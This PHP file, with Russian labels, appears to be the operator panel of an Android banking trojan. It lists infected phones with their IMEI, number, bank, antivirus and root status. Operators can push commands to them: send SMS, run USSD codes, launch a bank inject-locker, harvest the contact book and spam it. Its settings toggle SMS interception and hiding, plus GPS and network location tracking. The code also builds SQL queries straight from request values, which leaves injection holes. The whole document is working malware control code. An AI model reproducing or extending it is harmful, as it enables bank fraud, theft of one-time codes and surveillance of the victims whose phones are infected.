<?php
if (!(isset($_SESSION['Name'])))
{
	//идем на страницу авторизации
	header("Location: /login.php");
//	exit;
}
?>
<div class="content">

<script type="text/javascript">
    function checkAll(checkId){
        var inputs = document.getElementsByTagName("input");
        for (var i = 0; i < inputs.length; i++) { 
            if (inputs[i].type == "checkbox" && inputs[i].id == checkId) { 
                if(inputs[i].checked == true) {
                    inputs[i].checked = false ;
                } else if (inputs[i].checked == false ) {
                    inputs[i].checked = true ;
                }
            }  
        }  
    }
</script>

<table class="footable table_dark" align="center" border="1" cellspacing="0" cellpadding="0" width=100%>
	<thead class="header_table_bots" >	
	    <th><input type="checkbox" id="chk_new"  onclick="checkAll('chk');" />
		</th>
		<th>ID Bots</th>
		<th>Номер</th>	
		<th>Версия<br>ОС</th>
		<th>Версия<br>apk</th>
		<th>Страна</th>
		<th>Банк</th>
		<th>АВ</th>
		<th>Модель</th>
		<th>Админ</th>
		<th>Экран</th>
		<th>on/off</th>
		<th>Дата<br>заражения</th>
		<th>Логи</th>
	</thead>


	<?php
		include 'crypt.php';
		include 'config.php';
		
		$count_id_page=0;
		$page = $_GET["page"];
		$page1 = $_GET["page"];
		$count_id = 30;
		
		//---------Читаем с файла сортировку---
		$sostoya = ""; 
		$countr = ""; 
		$colors = ""; 
		$ver_apk = "";
		$banks = "";
		
		if(file_exists("private/sort.txt"))
		{
		$f = fopen("private/sort.txt", "r");
		$getFile = fgets($f); 
		fclose($f);
		
		$massiv_kat = explode("|", $getFile);
		$sostoya = $massiv_kat[0]; 
		$countr = $massiv_kat[1]; 
		$colors = $massiv_kat[2]; 
		$ver_apk = $massiv_kat[3]; 
		$banks = $massiv_kat[4]; 
		}
		
		
		if($sostoya!="all" || $countr!="all" || $colors!="all" || $ver_apk!="all" || $banks!="all")
		{
			$count_id = 10000000000000;
		}
	
		if($page =="" || $page == "1")
		{
			$page=0;
		}
		else
		{
			$page = ($page*$count_id)-$count_id;
		}
			
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
        $connection->exec('SET NAMES utf8');       
        $sql = "SELECT * FROM kliets limit $page,$count_id";
		$booleanIMEI = false;
				
		
		//echo encrypt("12345:12.12:34.34:GPS:","qwe");			
					
		//echo decrypt("49 5q 5w 5e 53 37 5w 65 49 5q 46 49 5q 37 5w 65 5w 5e 37 5w 65 5w 5e 37 5w 65 7w 8q 83","qwe");	
							
		
					
		//*****Обработка запросa Для удаления!
		if(isset($_POST["delete"]))
		{
			if (preg_match("/checks/",print_r($_POST,true))) 
			{
				foreach($_POST["checks"] as $id)
				{
					$id_del = explode(":", $id); 
					$sql2 = "DELETE FROM kliets WHERE id='".$id_del[0]."'";
					$connection->query($sql2);
				}
			}
				header ("Location: index.php?cont=kliets&page=$page1");
		}
		
		if(isset($_POST["add_commands"]))//вызываем модальную форму!
		{
			if (preg_match("/checks/",print_r($_POST,true))) 
			{
				foreach($_POST["checks"] as $imei)
				{
					echo "<script>";
						echo "$(document).ready(function(){";		
							echo "$('#parent_modal').css({'display':'block'});";
						echo "});";
					echo "</script>";
				}
			}
		}
		
		if(isset($_POST["sorting"]))//Открываем форму логи!
		{
		
			$log_IMEI = $_POST["sorting"];
					echo "<script>";
						echo "$(document).ready(function(){";		
							echo "$('#sort_modal').css({'display':'block'});";
						echo "});";
					echo "</script>";
		}
		
		if(isset($_POST["click_log"]))//Открываем форму логи!
		{
		
			$log_IMEI = $_POST["click_log"];
					echo "<script>";
						echo "$(document).ready(function(){";		
							echo "$('#log_modal').css({'display':'block'});";
						echo "});";
					echo "</script>";
		}
		
		if(isset($_POST["click_set"]))//Открываем форму настроек!
		{
		
			$set_IMEI = $_POST["click_set"];
					echo "<script>";
						echo "$(document).ready(function(){";		
							echo "$('#set_modal').css({'display':'block'});";
						echo "});";
					echo "</script>";
		}
		
		//******батоны и переменые с базы!********

	    echo "<form name='callback' method='post'>";
		echo "<input type='submit'  value='Добавить команду' name='add_commands' class='submit'/>";
		echo "<input type='submit' value='Удалить' name='delete' class='submit'/>";
		echo "<input type='submit' value='Сортировка' name='sorting' class='submit'/>";
		echo "<input type='submit' value='Обновить' name='refresh' class='submit'/>";

		$count_bots = 0;
		
		foreach($connection->query($sql) as $row)
		{
			$ID = $row['id'];
			$IMEI = $row['IMEI'];
			$number = $row['number'];
			$version = $row['version'];
			$version_apk = $row['version_apk'];
			$country = $row['country'];
			$bank = $row['bank']; 
			$AV=$row['av'];
			$model = $row['model'];
			$lastConnect = $row['lastConnect'];
			$firstConnect = $row['firstConnect'];
			$l_inj=$row['inj'];
			$l_bank=$row['l_bank'];
			$l_log=$row['log'];
			$root=$row['r00t'];
			$screen=$row['screen'];
			$color=$row['color'];
			
			//******Получаем иконку состояния бота, вычисляем дату****
			$arr_data_from = explode(" ", $row['lastConnect']);
			$arr_data_till = explode(" ", date('Y-m-d H:i')); 
				
			$date_from = $arr_data_from[0];
			$date_till = $arr_data_till[0]; 
			
			$date_from = explode('-', $date_from);
			$date_till = explode('-', $date_till);
	 
			$time_from = mktime(0, 0, 0, $date_from[1], $date_from[2], $date_from[0]);
			$time_till = mktime(0, 0, 0, $date_till[1], $date_till[2], $date_till[0]);
			
			$day = ($time_till - $time_from)/60/60/24; //получаем разницу кол-во дней!
			//----------Секунды!-------/
			$date1 = new \DateTime($row['lastConnect']);
			$date2 = new \DateTime(date('Y-m-d H:i'));
			$diff = $date2->diff($date1);
			// разница в секундах
			$seconds = ($diff->y * 365 * 24 * 60 * 60) + //получаем разницу в секундах!
			($diff->m * 30 * 24 * 60 * 60) +
			($diff->d * 24 * 60 * 60) +
			($diff->h * 60 * 60) +
			($diff->i * 60) +
			$diff->s;
			//----------обработка состояние иконки on/off-------/
			if($day>=2)//Дни!
			{
				$img="/images/icons/kill.png";
				$getSortON_OFF="kill";
			}
			else
			{
				if($seconds<=120)
				{$img="/images/icons/online.png";
				$getSortON_OFF="online";}
				else
				{$img="/images/icons/offline.png";
				$getSortON_OFF="offline";}
			}
			//************Иконки ЛОГОВ***************************************
			if($l_inj == "1")
			{$icon_inj="/images/icons/inj_on.png";}
			else
			{$icon_inj="/images/icons/inj_off.png";}
		
			if($l_bank == "1")
			{$icon_bank="/images/icons/bank_on.png";}
			else
			{$icon_bank="/images/icons/bank_off.png";}
		
			if($l_log == "1")
			{$icon_log="/images/icons/log_on.png";}
			else
			{$icon_log="/images/icons/log_off.png";}
		
			/**/
			if($root == "1")
			{$icon_root="/images/icons/V.png";}
			else
			{$icon_root="/images/icons/X.png";}
		
			if($seconds<=120)
			{
				if($screen == "1")
				{$icon_screen="/images/icons/V.png";}
				else
				{$icon_screen="/images/icons/X.png";}
			}
			else
			{
				$icon_screen="/images/icons/X.png";
			}
			//----страны
			
			if($country == "") $country = "not";
				
			$country =  mb_strtolower($country);	
			//************Данные в таблице********************************************
			// зел #00cc05;
			// red #d60000
			// син #0004d6
			// фил #ca00d6
			// желт #ffb305
			
			if($color == "red"){
				echo "<tr class='table_bots' style='color: #d60000;'>";
			}else if($color == "blue"){
				echo "<tr class='table_bots' style='color: #0004d6;'>";
			}else if($color == "yellow"){
				echo "<tr class='table_bots' style='color: #ffe238;'>";
			}else if($color == "purple"){
				echo "<tr class='table_bots' style='color: #ca00d6;'>";
			}else if($color == "blue2"){
				echo "<tr class='table_bots' style='color: #38ffdd;'>";
			}else if($color == "green"){
				echo "<tr class='table_bots' style='color: #00cc05;'>";
			}else{
				echo "<tr class='table_bots' style='color: #A4A4A4;'>";
			}
			//******************Обработка банка********
			$number = str_replace(")",")</br>",$number);
			$model = str_replace(" (","</br>(",$model);
			$firstConnect= str_replace(" ","</br>",$firstConnect);
			
			//*****************************************
			$ver_apk = $massiv_kat[3]; 
		$banks = $massiv_kat[4];
		
		
			if($sostoya == "" || $sostoya == "all" || $sostoya == $getSortON_OFF)
			{
				if($countr == "" || $countr == "all" || $countr == $country)
				{
					if($colors == "" || $colors == "all" || $colors == $color || ($colors == "gray" && $color == ""))
					{
						if($ver_apk == "" || $ver_apk == "all" || $ver_apk == $version_apk)
						{
							if($banks == "" || $banks == "all" || $banks == "on" && $bank!="no" || $banks == "off" && $bank=="no")
							{
	
			echo "
				<td><input type=checkbox name=checks[] id='chk' value=$ID:$IMEI></input></td>
				<td>$IMEI</td>
				<td>$number</td>
				<td>$version</td>
				<td>$version_apk</td>
				<td><a title='$country'><img src='/images/country/$country.png' width='16px'/></a></td>
				<td>$bank</td>
				<td>$AV</td>
				<td>$model</td>
				<td>
				<a title='root права'><img src=$icon_root width='16px'/></a>
				</td>
				<td>
				<a title='Состояние экрана'><img src=$icon_screen width='16px'/></a>
				</td>
				<td><a title='$lastConnect'><img src=$img width='16px'/></a></td>
				<td>$firstConnect</td>
				<td>
				<a title='Инжект'><img src=$icon_inj width='16px'/></a>
				<a title='Visa'><img src=$icon_bank width='16px'/></a>
			    <button class='btn_log' name='click_log' value='$IMEI' title='Логи' ><img src='$icon_log' title='Логи' alt='img' width='16px' class='img_log'/></button>
				<button class='btn_log' name='click_set' value='$IMEI' title='Настройки' ><img src='/images/icons/fe.png' title='Настройки' alt='img' width='16px' class='img_log'/></button>
				</td>
				</tr>";		
			}}}}}		
		}
		 echo "</form>";
		
		
	
		//	id 	IMEI 	number 	version 	country 	bank 	model 	lastConnect 	firstConnect 
		?>
</table>
<?php

//НОМЕРА СТРАНИЦ
        $connection->exec('SET NAMES utf8');       
        $sql2 = "SELECT * FROM kliets";
		foreach($connection->query($sql2) as $row)
		{
			$count_id_page++;	
		}
			
	    $a = ceil($count_id_page/$count_id);
		echo "<center>";
		for($b=1;$b<=$a;$b++)
		{
			echo "<a style='color: #fff; font-family: Consolas;' href='index.php?cont=kliets&page=$b' style='text-decoration:none;'>$b</a>";
		}
		echo "</center>";
?>

<?php//-------------конец таблице--------------------начало----------------------Модальное окно для Добавления команд-----?>


<div id = "parent_modal">
	<div id = "modal">
	<a id="exit" href="index.php?cont=kliets&page=<?php echo $page1;?>" style="cursor: pointer; color: Red;" onclick="document.getElementById('parent_modal').style.display = 'none'";>X</a>
		<div class="styled-select">
		
		<form name="modal_command"  method="POST" action="/private/command_go_modul.php"> 
			Выбраные боты<select name="comboBox_imeis" style="color: #fff">
			
			
<?php 		//--------вставляем IMEIs в текстовое поле--------

		if(isset($_POST["add_commands"]))
		{
			if (preg_match("/checks/",print_r($_POST,true))) 
			{
				$t_i="";
				foreach($_POST["checks"] as $imei)
				{
					$imei_add = explode(":", $imei);
					echo "<option value='$imei_add[0]'>$imei_add[1]";
					$t_i = "$t_i:$imei_add[1]";
				}
				echo "<input type='text' value='$t_i' name='text_imei' style='visibility:hidden'/>";
			}
		}	
?>
			</select> 
			Выберите команду
				<select  name="comboBox_commands" onchange="showOption(this)" style="color: #fff">
					<option value='null'>
					<option value='sentSMS'>Отправить СМС
					<option value='startUSSD'>Запрос USSD
					<option value='startinj'>Запустить инжект-локер
					<option value='numberGO'>Получить номера с телефонной книги
					<option value='numberGOsendSMS'>Рассылка СМС по телефонной книге
				</select> 

			<div  id="div_sent_sms" name="div_sent_sms" style="visibility:hidden">
			Введите номер<input type="text" name="text_number" id="styled-select" style="color: #fff; background: #1D1F24;"></input>
			Введите текст СМС<input type="text" name="text_msg" id="styled-select" style="color: #fff; background: #1D1F24;"></input>
			</div>
				
			<div id="div_ussd" style="visibility:hidden; margin-top:-77px;">
			Введите запрос USSD<input  type="text" name="text_ussd" id="styled-select" style="color: #fff; background: #1D1F24;"></input>
			</div>
			
			<div id="div_send_tel_book" style="visibility:hidden; margin-top:-40px;">
			Введите текст СМС для рассылки по телефонной книге<input  type="text" name="text_sms_tel_book" id="styled-select" style="color: #fff; background: #1D1F24;"></input>
			</div>
			
			<div id="div_start_inj" style="visibility:hidden; margin-top:-43px;">
			Выберите название инжекта
			<select  name="comboBox_inj" style="color: #fff">
			
			<?php
			
			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');       
			$sql = "SELECT * FROM injection";
	
				
			foreach($connection->query($sql) as $row)
			{
				
				$inj_name = $row['name'];
				$inj_process = $row['process'];
				$massivProc = explode(",", $inj_process);
				$inj_process = $massivProc[0]; 

				echo "<option value='$inj_process'>$inj_name";
			}
			//<option value='grab1'>Грабинг СС
			?>
					
					
					
				</select> 
			</div>
			
			<script type="text/javascript">
			  function showOption(el)
			  {
				  if(el.options[el.selectedIndex].value == "sentSMS")//отправка смс
				  {
					   document.getElementById("div_sent_sms").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_sent_sms").style.visibility = "hidden";
				  }
				  if(el.options[el.selectedIndex].value == "startUSSD")//USSD
				  {
					   document.getElementById("div_ussd").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_ussd").style.visibility = "hidden";
				  }
				  if(el.options[el.selectedIndex].value == "numberGOsendSMS")//Рассылка СМС по телефонной книге
				  {
					   document.getElementById("div_send_tel_book").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_send_tel_book").style.visibility = "hidden";
				  }
				  
				  if(el.options[el.selectedIndex].value == "startinj")//injection
				  {
					   document.getElementById("div_start_inj").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_start_inj").style.visibility = "hidden";
				  }
			  }
			</script>
			
			<input style="margin-top:25px;" type="submit" id="bth_add_command" value="Активировать команду" name="bth_add_command" class="submit"/>
				

<?php echo "<input type='text' value='$page1' name='ref' style='visibility:hidden'/>"; //передаем номер страницы?>
			</form>
		</div>
	</div>
</div>

<?php//--форма ЛОГ модульное окно!------rows="31" cols="158"--------?>
<div id = "log_modal">
	<div id = "modal_l">
	<a id="exit" href="index.php?cont=kliets&page=<?php echo $page1;?>"  style="margin-left:97%; cursor: pointer; color: Red;" onclick="document.getElementById('log_modal').style.display = 'none'";>X</a>
		<div class="styled-select">
			
			<textarea readonly name="mesage"  wrap="virtual" class="textlog">
			<?php 
			
			$sql3 = "UPDATE kliets SET inj = '0', l_bank = '0', log = '0' WHERE IMEI = '$log_IMEI';";
			$connection->query($sql3);
			if (@fopen("private/logs/$log_IMEI.log", "r")){ // проверяем на существование файла
				//читаем
				   $filename = "private/logs/$log_IMEI.log";
                  $handle = fopen($filename, "r");
                  $contents = fread($handle, filesize($filename));
                  fclose($handle);
                  echo "$contents";
			}
			?></textarea>
				
		</div>
	</div>
</div>

<?php//--форма настроек модульное окно!------rows="31" cols="158"--------?>
<div id = "set_modal">
	<div id = "modal_s" style="Height: 625px; margin-top: 90px;">
	<a id="exit"  href="index.php?cont=kliets&page=<?php echo $page1;?>"  style="cursor: pointer; color: Red;" onclick="document.getElementById('set_modal').style.display = 'none'";>X</a>
		<div class="styled-select">
		<form name="modal_set"  method="POST" action="/private/set_go_modul.php"> 
		<?php
		$connection4 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection4->exec('SET NAMES utf8');
		
		$sql4 = "SELECT * FROM settings";
		
		$inject_str = "";
		$text_delsms = "";
		
		$IMEI = "";
		$inject ="";
		$del_sms = "";
		$state = "";
		$ret_num = "";
		$ret_sig1 = "";
		$ret_sig2 = "";
		$check_true = "";
		
		foreach($connection4->query($sql4) as $row)
		{
			$IMEI = $row['IMEI'];
			$inject = $row['inject'];
			$del_sms = $row['del_sms'];
			$state = $row['state'];
			
			
			if($IMEI == $set_IMEI)
			{
				$inject_str=$inject;
				$text_delsms = $del_sms;
				$ret_num = $row['avtootvet_num'];
				$network= $row['avtootvet_sig1'];
				$gps = $row['avtootvet_sig2'];
				$check_true = $row['avtootvet_true'];
				break;
			}
			
		}
		$inject_s = explode("/", $inject_str);
		
		if($state == 1)
		{
			Echo "<a style='color: Red;'><h5>Настройки не активны, бот не обновил их, подождите..</h5></a>";
		}else
		{
			Echo "<a style='color: #00FF00;'><h5>Настройки активны!</h5></a>";
		}
		
		echo "	Выбраные боты<select name='comboBox_imeis' style='color: #fff'>";
		
		if (preg_match("/checks/",print_r($_POST,true))) 
		{
				$t_i="";
				foreach($_POST["checks"] as $imei)
				{
					$imei_add = explode(":", $imei);
					echo "<option value='$imei_add[0]'>$imei_add[1]";
					$t_i = "$t_i:$imei_add[1]";
				}
				echo "<input type='text' value='$t_i' name='text_imei_set' style='visibility:hidden'/>";
		}
		else
		{
			echo "<option value='0'>$set_IMEI";
			echo "<input type='text' value='$set_IMEI' name='text_imei_set' style='visibility:hidden'/>";
		}
		
		echo "</select> ";
		
		$sql4 = "SELECT * FROM injection";
		Echo "<a><h5>Инжекты</h5></a>";
		foreach($connection4->query($sql4) as $row)
		{
			$ID_inj = $row['id'];
			$name_inj = $row['name'];
			
			$bool_inj=false;
			foreach($inject_s as $ids)
			{
				$bool_inj=false;
				if($ids == $ID_inj)
				{
					echo "<input type=checkbox name=check_set[] value=$ID_inj style='margin-top: -10px;' checked='checked'>$name_inj</input>";
					break;
				}
				else
				{
					$bool_inj = true;
				}
			}
			
			if($bool_inj == true)
			{
				echo "<input type=checkbox name=check_set[] value=$ID_inj style='margin-top: -10px;'>$name_inj</input>";
			}
		}
		echo "</br></br>";
		if($check_true == "1")
		{
			echo "<input type=checkbox name=check_set_v value='1' style='margin-top:0px;' checked='checked'>Вкл/выкл перехват СМС</input>";
		}else
		{
			echo "<input type=checkbox name=check_set_v value='1' style='margin-top:0px;'>Вкл/выкл перехват СМС</input>";
		}
		echo "</br>";
		if($text_delsms == "1")
		{
			echo "<input type=checkbox name=check_set_d value='1' style='margin-top:0px;' checked='checked'>Вкл/выкл скрытие СМС(до версии 4.4)</input>";
		}
		else
		{
			echo "<input type=checkbox name=check_set_d value='1' style='margin-top:0px;'>Вкл/выкл скрытие СМС(до версии 4.4)</input>";
		}
		echo "</br>";
		if($network == "1")
		{
			echo "<input type=checkbox name=check_set_network value='1' style='margin-top:0px;' checked='checked'>Вкл/выкл геолокацию NETWORK</input>";
		}
		else
		{
			echo "<input type=checkbox name=check_set_network value='1' style='margin-top:0px;'>Вкл/выкл геолокацию NETWORK</input>";
		}
		echo "</br>";
		if($gps == "1")
		{
			echo "<input type=checkbox name=check_set_gps value='1' style='margin-top:0px;' checked='checked'>Вкл/выкл геолокацию GPS</input>";
		}
		else
		{
			echo "<input type=checkbox name=check_set_gps value='1' style='margin-top:0px;'>Вкл/выкл геолокацию GPS</input>";
		}
			
		
		?>
		
		</br></br>Выберите цвет для выделяния
		 <select  name='ccolor' style='color: #fff'>
		    <option value='non'>Не выбран
			<option value='no'>Серый
			<option value='red'>Красный
			<option value='blue'>Синий
			<option value='blue2'>Голубой
			<option value='yellow'>Желтый
			<option value='purple'>Фиолетовый
		 </select>
		
		</br>
		<input type="submit" id="bth_add_set" value="Сохранить настройку" name="bth_add_set" class="submit" style="margin-top: 6px;"/>
		

		<?php echo "<input type='text' value='$page1' name='ref' style='visibility:hidden'/>"; //передаем номер страницы?>
		</form>
		</div>
	</div>
</div>

<?php//--Сортировка"--------?>
<div id = "sort_modal" style="padding-top:70px;">
	<div id = "modal_s" style="Width:30%; Height: 34%; background: #1D1F24;	margin: 100px auto 0 auto;	padding: 10px;	border-radius: 5px;">
	<a id="exit" href="index.php?cont=kliets&page=<?php echo $page1;?>"  style="margin-left:97%; cursor: pointer; color: Red;" onclick="document.getElementById('log_modal').style.display = 'none'";>X</a>
		<form name="modal_set"  method="POST" action="/private/sort_go_modul.php"> 
		<div class="styled-select">
			
			<?php
			
			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');       
			$sql = "SELECT * FROM kliets";
			
			$massivCountry="";
			$massivVersion="";
			foreach($connection->query($sql) as $row)
			{
			$country = $row['country'];
			if(!preg_match("/$country/",$massivCountry))$massivCountry="$massivCountry/$country";
			
			$version_apk = $row['version_apk'];
			if(!preg_match("/$version_apk/",$massivVersion))$massivVersion="$massivVersion/$version_apk";
			}
			?>
			
			Состояние ботов
			<select  name="sort_kat" style="color: #fff">
				<option value='all'>Все
				<option value='online'>Онлайн
				<option value='offline'>Оффлайн
				<option value='kill'>Оффлайн более 2х дней
			</select> 
			</br></br>
			
			Страна
			<select  name="sortCountry" style="color: #fff">
				<option value='all'>Все
				
				<?php
				$massivC = explode("/", $massivCountry);
				
				foreach($massivC as $mc)
				{
					if($mc!="")echo "<option value='$mc'>$mc";
				}
				?>
			</select> 
			</br></br>
			Цвет
			<select  name="color" style="color: #fff">
				<option value='all'>Все
				<option value='purple'>Фиолетовый
				<option value='red'>Красный
				<option value='blue'>Синий
				<option value='blue2'>Голубой
				<option value='yellow'>Желтый
				<option value='gray'>Серый
			</select> 
			</br></br>
			Версия apk
			<select  name="versions" style="color: #fff">
				<option value='all'>Все
				
				<?php
				$massivV = explode("/", $massivVersion);
				
				foreach($massivV as $mv)
				{
					if($mv!="")echo "<option value='$mv'>$mv";
				}
				?>
			</select> 
			</br></br>
			Банк
			<select  name="bank" style="color: #fff">
				<option value='all'>Все
				<option value='on'>Есть банк
				<option value='off'>Нет банка
			</select> 
			
			<center><input type="submit" id="bth_add_sort" value="Сортировать" name="bth_add_sort" class="submit" style="margin-top: 6px; font-size: 14px; height: 30px;"/></center>
		
		<?php echo "<input type='text' value='$page1' name='ref' style='visibility:hidden'/>"; //передаем номер страницы?>
		</div>
		</form>
	</div>
</div>

</div>

